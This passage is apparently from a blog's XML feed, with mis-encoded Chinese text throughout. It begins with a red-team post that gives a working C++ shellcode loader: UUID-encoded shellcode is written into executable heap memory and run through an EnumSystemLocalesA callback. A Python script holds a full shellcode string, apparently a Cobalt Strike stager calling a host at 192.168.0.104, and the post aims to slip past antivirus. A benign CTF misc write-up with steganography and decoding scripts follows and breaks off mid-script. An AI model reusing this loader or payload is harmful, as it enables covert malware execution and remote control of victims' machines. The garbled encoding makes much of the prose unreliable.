class="string">&quot;cfafb2ac-e2bb-b0af-ca5b-08834c927ab5&quot;</span>,<span class="string">&quot;07d2b997-8fc9-80b7-fc26-3da3d19e2942&quot;</span>,<span class="string">&quot;780bcd05-11c2-4f86-6657-dae24b98cc46&quot;</span>,<span class="string">&quot;febde54d-2cc7-d3c4-e5c0-f943cad41d5a&quot;</span>,<span class="string">&quot;6800da73-b5f0-56a2-ffd5-6a4068001000&quot;</span>,<span class="string">&quot;00006800-0040-6857-58a4-53e5ffd593b9&quot;</span>,<span class="string">&quot;00000000-d901-5351-89e7-576800200000&quot;</span>,<span class="string">&quot;12685653-8996-ffe2-d585-c074c68b0701&quot;</span>,<span class="string">&quot;75c085c3-58e5-e8c3-a9fd-ffff31302e31&quot;</span>,<span class="string">&quot;32342e39-312e-3434-0012-345678000000&quot;</span> &#125;; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//è·å¾—å¯æ‰§è¡Œçš„å¥æŸ„</span></span><br><span class="line">  <span class="keyword">void</span>* ha = HeapAlloc(hc, <span class="number">0</span>, <span class="number">0x100000</span>);<span class="comment">//ç”³è¯·å †ç©ºé—´</span></span><br><span class="line">  <span class="keyword">if</span> (ha == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;å†…å­˜ç”³è¯·å¤±è´¥ï¼&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  DWORD_PTR hptr = (DWORD_PTR)ha;</span><br><span class="line">  <span class="keyword">int</span> elems = <span class="keyword">sizeof</span>(uuids) / <span class="keyword">sizeof</span>(uuids[<span class="number">0</span>]);<span class="comment">//è·å¾—éœ€è¦å†™å…¥uuidsæ•°ç»„å…ƒç´ ä¸ªæ•°</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; elems; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//cout &lt;&lt; (RPC_CSTR)uuids[i] &lt;&lt; endl;</span></span><br><span class="line">    <span class="comment">//cout &lt;&lt; (UUID*)hptr &lt;&lt; endl;</span></span><br><span class="line">    RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);<span class="comment">//å†™å…¥shellcode</span></span><br><span class="line">      <span class="keyword">if</span> (status != RPC_S_OK)<span class="comment">//åˆ¤æ–­æ˜¯å¦å†™å…¥æ­£å¸¸</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;UuidFromeStringA()!=S_OK&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        CloseHandle(ha);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    hptr += <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//((void(*)())ha)();</span></span><br><span class="line">  EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, <span class="number">0</span>);<span class="comment">//å›è°ƒå‡½æ•°,è¿è¡Œshellcode</span></span><br><span class="line">  CloseHandle(ha);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>csç›´æ¥ä¸Šçº¿ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦ç”¨çš„ä¸€ä¸ªpythonè½¬æ¢uuidè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">shellcode=<span class="string">b&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x76\x31\x62\x53\x00\x7f\x91\xe7\xa6\x06\xaf\x0e\x4c\xd7\x9a\xe9\x05\x62\x44\xda\x5c\x48\x62\xfe\x2c\x1a\xb1\x46\xe5\x9e\x3b\x14\x69\x39\x97\x1f\x0b\xfb\x1a\xf6\x8d\x89\x79\x72\x62\x8f\xcc\x16\x3a\xab\x4c\x4b\x8d\x50\xe4\xb5\xa1\x30\x1f\x46\x17\x84\xa1\x17\x69\xec\x2a\x4a\xfe\xe7\xb0\x87\xb9\x7b\x5c\x61\x3a\xfe\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4d\x41\x53\x42\x29\x0d\x0a\x00\x79\x00\x1b\x42\x2e\x57\x64\xda\x01\x3c\x02\xc6\x2a\x4a\xda\xc8\x22\x1e\x92\x76\x61\x47\x80\x02\xb1\x8c\x24\x61\x92\x9f\x53\x58\x73\xde\xae\x52\x30\x67\x82\x47\x32\x4b\x35\x10\x11\xfd\xe2\x1d\x2b\x26\x18\x6b\x9d\x85\x58\x10\x32\xa4\x0a\xcd\x92\xc1\x5a\x10\x50\x6b\xe7\x87\x2a\xd9\xcf\xce\x92\x06\x1c\x39\x6b\x75\x42\xfb\x81\x4b\x60\x0b\x56\xcc\x1b\xa7\xe6\x0b\x0f\x49\xdd\xc5\xcc\x48\x0d\xf4\xdb\x98\xf1\xbf\x0d\xa8\x9b\x45\xcb\x4f\x41\x26\x96\xf5\x0d\x4d\xe4\x58\x83\x1f\x81\x6e\x67\xea\x94\xab\x49\x5c\xc0\x6f\x1d\x8c\x78\x8c\xc5\xd7\x01\x4d\xc7\x89\xc1\x8e\xe5\x46\x6d\xab\x99\x5f\xa2\x26\xe1\xcc\x58\x8c\xef\x16\xcd\xe5\x02\x4a\xf9\xe5\x42\x1c\xb8\x4a\x96\x7e\x69\x9a\x30\x37\x97\x0d\x4e\x7e\x4c\xaf\x69\xcc\x9a\x36\xb3\xe5\x2a\x7b\x77\x64\x48\x30\xa3\x44\x27\x76\xd8\xe6\x03\x2a\x56\xeb\xe7\x21\xb1\xf6\x78\x2e\xf0\xaa\x43\xdf\x46\xa3\x95\x14\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x30\x2e\x31\x30\x34\x00\x12\x34\x56\x78\x90\x90&quot;</span></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    bytes_a = shellcode[i * <span class="number">16</span>: <span class="number">16</span> + i * <span class="number">16</span>]</span><br><span class="line">    b = uuid.UUID(bytes_le=bytes_a)</span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(b))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;shellcode.c&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;const char* uuids[] =&#123;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> UUID <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        f.write(<span class="string">&quot;\&quot;&quot;</span>+UUID+<span class="string">&quot;\&quot;&quot;</span>+<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;&#125;;&quot;</span>)</span><br><span class="line">print(<span class="built_in">list</span>)</span><br></pre></td></tr></table></figure><p>æ›¿æ¢shellcodeï¼Œä½ æ‡‚æˆ‘çš„æ„æ€å§ï¼<br>åœ¨å®éªŒçš„æ—¶å€™æˆ‘å¿˜äº†å…³å¡å·´ï¼Œç„¶åä½ æ‡‚å¾—ï¼å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ</p><h1 id="å­¦ä¹ æ€»ç»“"><a href="#å­¦ä¹ æ€»ç»“" class="headerlink" title="å­¦ä¹ æ€»ç»“"></a>å­¦ä¹ æ€»ç»“</h1><p>è¿™é‡Œè™½ç„¶è¿˜æ˜¯ç»™æ€äº†ï¼Œé‚£æ˜¯å› ä¸ºè¿™ç§uuidè¿˜æ˜¯å­˜åœ¨ä¸€å®šçš„ç‰¹å¾ï¼Œè¿˜æ˜¯ä¼šè¢«æ€ï¼Œä½†æ˜¯è¿™é‡Œè®²ç©¶çš„æ˜¯ä¸€ä¸ªæ€è·¯ï¼Œå¯ä»¥ç”¨å…¶ä»–windows api æ¥å‘å†…å­˜ä¸­å†™å…¥shellcodeï¼ŒåŠ è½½shellcodeï¼Œè€Œä¸”åœ¨å›½å¤–å¤§ä½¬blogæåˆ°äº†å¾ˆå¤šwindows apiéƒ½å¯ä»¥å®ç°è¿™æ ·çš„åŠŸèƒ½ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-å¤§å‰å¤§åˆ©æ¯&amp;&amp;â€œæ˜¥ç§‹æ¯â€æ–°å¹´æ¬¢ä¹èµ› 2021</title>
      <link href="2021/01/30/2020ctfshow-%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AF&amp;&amp;%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/"/>
      <url>2021/01/30/2020ctfshow-%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AF&amp;&amp;%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‰è¨€ï¼šæ¯”èµ›å½“å¤©æ²¡ç©ºï¼Œä¸è¿‡äº‹åå¬Lumoså¸ˆå‚…è¯´é‡Œé¢é¢˜ç›®æŒºæœ‰æ„æ€çš„ï¼Œäºæ˜¯å°±å†³å®šä»Šå¤©å¤ç°ä¸€æ³¢ï¼ˆåé™„2021â€œæ˜¥ç§‹æ¯â€æ–°å¹´æ¬¢ä¹èµ›çš„è§£é¢˜æ€è·¯ï¼‰</p></blockquote><hr><h1 id="å¤§å‰å¤§åˆ©æ¯"><a href="#å¤§å‰å¤§åˆ©æ¯" class="headerlink" title="å¤§å‰å¤§åˆ©æ¯"></a>å¤§å‰å¤§åˆ©æ¯</h1><h2 id="1-åå…«èˆ¬å…µå™¨"><a href="#1-åå…«èˆ¬å…µå™¨" class="headerlink" title="1.åå…«èˆ¬å…µå™¨"></a>1.åå…«èˆ¬å…µå™¨</h2><blockquote><p>æ„Ÿè°¢@i_keiå¸ˆå‚…ä¾›é¢˜<br>åˆ€ã€æªã€å‰‘ã€æˆŸã€æ–§ã€é’ºã€é’©ã€å‰ã€é­ã€é”ã€é”¤ã€æˆˆã€é•‹ã€æ£ã€æ§Šã€æ£’ã€çŸ›ã€è€™</p><p>Hint1ï¼šJPHS<br>Hint2ï¼šç”¨Notepad++æ‰“å¼€è¯•è¯•ï¼Ÿ<br>Hint3ï¼šå‰åç§å…µå™¨å¯¹åº”10è¿›åˆ¶ï¼Œåå…«ç§å¯¹åº”8è¿›åˆ¶</p><p><a href="https://blog.harvey.plus/usr/uploads/2021/1/rar"><strong>é™„ä»¶</strong></a></p></blockquote><p>æ ¹æ®åå­—åŠ ä¸ªåç¼€.rarï¼Œå†æ ¹æ®å‹ç¼©åŒ…æç¤º2021ç‰›å¹´å¤§å‰è§£å‹å¾—åˆ°åå…«èˆ¬å…µå™¨çš„å›¾ç‰‡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4250737814.png"></p><p>æ¥ç€JPHSéšå†™å¹¶æ ¹æ®é¢˜ç›®ä¾æ¬¡æ’åºå¾—åˆ°ä¸€ä¸²æ•°å­—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">136143999223163525817639797858700963935</span><br><span class="line">3044053720460556276610613346353724230575</span><br></pre></td></tr></table></figure><p>ç„¶åå‰åä¸ªåè¿›åˆ¶è½¬åå…­è¿›åˆ¶ï¼Œåå…«ä¸ªå…«è¿›åˆ¶è½¬åå…­è¿›åˆ¶å¾—åˆ°å­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b43544673686f775f31305f62415f42616e5f62316e675f51317d</span><br></pre></td></tr></table></figure><p>æœ€åhexè§£ç å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CTFshow_10_bA_Ban_b1ng_Q1&#125;</span><br></pre></td></tr></table></figure><h2 id="2-è¯·é—®å¤§å‰æ¯çš„ç­¾åˆ°æ˜¯åœ¨è¿™é‡Œç­¾å—"><a href="#2-è¯·é—®å¤§å‰æ¯çš„ç­¾åˆ°æ˜¯åœ¨è¿™é‡Œç­¾å—" class="headerlink" title="2.è¯·é—®å¤§å‰æ¯çš„ç­¾åˆ°æ˜¯åœ¨è¿™é‡Œç­¾å—"></a>2.è¯·é—®å¤§å‰æ¯çš„ç­¾åˆ°æ˜¯åœ¨è¿™é‡Œç­¾å—</h2><blockquote><p>flagä¸ºå…¨éƒ¨å°å†™å­—æ¯ï¼Œæ²¡æœ‰ç©ºæ ¼<br>@æ„Ÿè°¢cheyenneå¸ˆå‚…ä¾›é¢˜</p><p><a href="https://blog.harvey.plus/usr/uploads/2021/01/29448119.png"><strong>é™„ä»¶</strong></a></p></blockquote><p>ç»å…¸è€å¥—å¨ƒäº†ï¼Œåˆ†ç¦»å‡ºå››å¼ å›¾ç‰‡<br>æ ¹æ®æ‰«ç å¾—åˆ°çš„ä¿¡æ¯å¯çŸ¥å…³é”®åœ¨ç¬¬äºŒå¼ å›¾ç‰‡ï¼Œå°†å…¶æ”¾å…¥steg</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/861280115.png"></p><p>å¾ˆæ˜æ˜¾æ¯”å¯¹çŒªåœˆå¯†ç è¡¨å¾—åˆ°flagï¼šflag{dajiadoaidjb}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2577881711.png"></p><h2 id="3-ç‰›å¹´å¤§å‰"><a href="#3-ç‰›å¹´å¤§å‰" class="headerlink" title="3.ç‰›å¹´å¤§å‰"></a>3.ç‰›å¹´å¤§å‰</h2><blockquote><p>é¢˜ç›®ä¸‹è½½ è“å¥äº‘ä¸‹è½½åœ°å€ï¼š<a href="https://wws.lanzous.com/i1Ac0jybrvc">https://wws.lanzous.com/i1Ac0jybrvc</a> ç™¾åº¦äº‘ä¸‹è½½åœ°å€ï¼š <a href="https://pan.baidu.com/s/14EXw7U4w0Am0oP_xRXfbqQ">https://pan.baidu.com/s/14EXw7U4w0Am0oP_xRXfbqQ</a> æå–ç ï¼šns2k<br>æ„Ÿè°¢i_keiå¸ˆå‚…ä¾›é¢˜</p><p>Hint1ï¼šä¸è¦æ ¼å¼åŒ–å“Ÿï¼Œçœ‹çœ‹å¼•å¯¼æ‰‡åŒºæ˜¯ä¸æ˜¯ä¸¢ä¸œè¥¿äº†<br>Hint2ï¼šå‹ç¼©åŒ…å¯†ç åœ¨å›¾ç‰‡æ–‡ä»¶å¤´é‡Œ</p></blockquote><p>vhdç›´æ¥æ‰“å¼€å‘ç°ä¸èƒ½è£…è½½ï¼ˆå¼•å¯¼æ‰‡åŒºå…¨éƒ¨è¢«æŠ¹é™¤ï¼‰ï¼Œäºæ˜¯ç”¨winhexæ‰“å¼€è¯»å–å‘ç°æœ‰å¼ å›¾ç‰‡å’Œå‹ç¼©åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/418812427.png"></p><p>å‹ç¼©åŒ…å¯†ç å°±æ˜¯å›¾ç‰‡çš„æ–‡ä»¶å¤´89504E47ï¼Œæœ€ç»ˆå¾—åˆ°flagï¼šflag{CTFshow_The_Year_of_the_Ox}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1245253420.png"></p><h2 id="4-ç®€å•çš„FM"><a href="#4-ç®€å•çš„FM" class="headerlink" title="4.ç®€å•çš„FM"></a>4.ç®€å•çš„FM</h2><blockquote><p>ç®€å•çš„FM<br>æ„Ÿè°¢@é˜¿ç‹¸å¸ˆå‚…ä¾›é¢˜</p><p><a href="https://blog.harvey.plus/usr/uploads/2021/1/misc1.wav"><strong>é™„ä»¶</strong></a></p></blockquote><p>åœ¨å¤ç°äº†ingâ€¦ï¼ˆ0%</p><h2 id="5-ç«¥è¯é•‡"><a href="#5-ç«¥è¯é•‡" class="headerlink" title="5.ç«¥è¯é•‡"></a>5.ç«¥è¯é•‡</h2><blockquote><p>ä¸€æ›²ç«¥è¯é•‡ï¼Œå¤šå°‘æ–­è‚ äººï¼Ÿ <a href="https://ctfshow.lanzous.com/iA8HFkn4q9c">https://ctfshow.lanzous.com/iA8HFkn4q9c</a><br>æ„Ÿè°¢@é˜¿ç‹¸å¸ˆå‚…ä¾›é¢˜</p><p>hint1ï¼šç¦»åˆ«<br>hint2ï¼šæ€å¿µ<br>hint3ï¼šçˆ±<br>hint4ï¼šå°è±¡</p></blockquote><p>binwalkåˆ†ç¦»å‡ºä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3789173368.png"></p><p>çˆ†ç ´å¾—åˆ°å¯†ç ï¼š67373</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1461826828.png"></p><p>æ¥ç€å°±æ˜¯ç®—æ³•è¿™å—äº†2333~ï¼ˆKNNï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">x_train = []</span><br><span class="line">y_train = []</span><br><span class="line">x_test = []</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;t.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    s = f1.readline()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    s = s.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    p1 = literal_eval(s.split(<span class="string">&quot;\t&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    p2 = literal_eval(s.split(<span class="string">&quot;\t&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    x_train.append(p1)</span><br><span class="line">    x_test.append(p2)</span><br><span class="line">    <span class="comment">#print(x_train)</span></span><br><span class="line">    <span class="comment">#print(x_test)</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    s = f2.readline()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    s = s.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    s = literal_eval(s)</span><br><span class="line">    y_train.append(s)</span><br><span class="line">    <span class="comment">#print(y_train)</span></span><br><span class="line">x_train = np.array(x_train)</span><br><span class="line">y_train = np.array(y_train)</span><br><span class="line">x_test = np.array(x_test)</span><br><span class="line"></span><br><span class="line">clf = KNeighborsClassifier(n_neighbors = <span class="number">1</span>)</span><br><span class="line">clf.fit(x_train, x_test)</span><br><span class="line">y_test = clf.predict(y_train)</span><br><span class="line"></span><br><span class="line">f3 = <span class="built_in">open</span>(<span class="string">&quot;3.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> y_test:</span><br><span class="line">    f3.write(<span class="built_in">str</span>(y_test[i]))</span><br><span class="line">f3.close()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1851802218.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;3.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">pic = Image.new(<span class="string">&quot;L&quot;</span>, (<span class="number">991</span>, <span class="number">79</span>))</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">79</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">991</span>):</span><br><span class="line">        <span class="keyword">if</span> fp[i] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            pic.putpixel([x,y], <span class="number">255</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y], <span class="number">0</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">pic.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3608572468.png"></p><h2 id="6-è‰²å›¾ç”Ÿæˆå™¨"><a href="#6-è‰²å›¾ç”Ÿæˆå™¨" class="headerlink" title="6.è‰²å›¾ç”Ÿæˆå™¨"></a>6.è‰²å›¾ç”Ÿæˆå™¨</h2><blockquote><p>æ¬¢è¿ä½¿ç”¨è‰²å›¾ç”Ÿæˆå™¨<br>å·²è·å–flagï¼Œæ­£åœ¨ä¸ºæ‚¨ç”Ÿæˆè‰²å›¾â€¦â€¦<br>è‰²å›¾ç”Ÿæˆå®Œæ¯•ï¼Œå‡†å¤‡ä¼ è¾“<br>æ­£åœ¨ä¼ è¾“è‰²å›¾â€¦â€¦<br>ERROR! æ£€æµ‹åˆ°å±è”½ç³»ç»Ÿï¼Œä¼ è¾“è¢«ä¸­æ–­<br>å‡†å¤‡ä¸ºè‰²å›¾æ‰“ç <br>æ­£åœ¨ç”Ÿæˆé©¬èµ›å…‹â€¦â€¦<br>æ‰“ç å®Œæˆï¼Œå‡†å¤‡æ·»åŠ å†—ä½™æ•°æ®â€¦â€¦<br>æ·»åŠ å®Œæˆï¼Œæ­£åœ¨æ‰“åŒ…â€¦â€¦<br>æ‰“åŒ…å®Œæˆï¼Œå‡†å¤‡ä¼ è¾“â€¦â€¦<br>ä¼ è¾“å®Œæˆï¼Œè¯·ç‚¹å‡»ä¸‹æ–¹é“¾æ¥ä¸‹è½½æ‚¨çš„è‰²å›¾<br>æ„Ÿè°¢@cheyenneå¸ˆå‚…ä¾›é¢˜</p><p>Hint1ï¼šé¢œè‰²å¾ˆé‡è¦ï¼Œä½†githubæ›´é‡è¦<br>Hint2ï¼šç¬¬ä¸€æ­¥å›¾ç‰‡å¾ˆé‡è¦ï¼Œtxtä¸é‡è¦<br>Hint3ï¼šçœ‹ä¸€çœ‹é©¬èµ›å…‹éƒ¨åˆ†çš„RGBå€¼ï¼Œæœ‰æ²¡æœ‰æƒ³åˆ°ä»€ä¹ˆå‘¢</p><p><a href="https://blog.harvey.plus/usr/uploads/2021/1/setu.zip"><strong>é™„ä»¶</strong></a></p></blockquote><p>åœ¨å¤ç°äº†ingâ€¦ï¼ˆ0%</p><h2 id="7-æ‹¼å›¾v2-0"><a href="#7-æ‹¼å›¾v2-0" class="headerlink" title="7.æ‹¼å›¾v2.0"></a>7.æ‹¼å›¾v2.0</h2><blockquote><p>æœ‰æ‰‹å°±è¡Œï¼Œæ²¡æ‰‹çš„å¯ä»¥æ‹¿çœ¼ç›å»çª<br>æ„Ÿè°¢@nimdaå¸ˆå‚…ä¾›é¢˜</p><p><a href="https://ctf.show/challenges#%E6%8B%BC%E5%9B%BEv2.0-912"><strong>é¢˜ç›®åœ°å€</strong></a></p></blockquote><p>chromeæ’ä»¶Save All Resourceså°†å…¶ä¸‹è½½è¿›è¡Œæ‹¼å›¾</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2761437209.png"></p><p>è·‘ä¸‹è„šæœ¬å¾—åˆ°flagï¼šflag{f4864ce0-18d6-4e45-bb51-08a9d47de97f}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1976149264.png"></p><p>è„šæœ¬é™„ä¸Šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 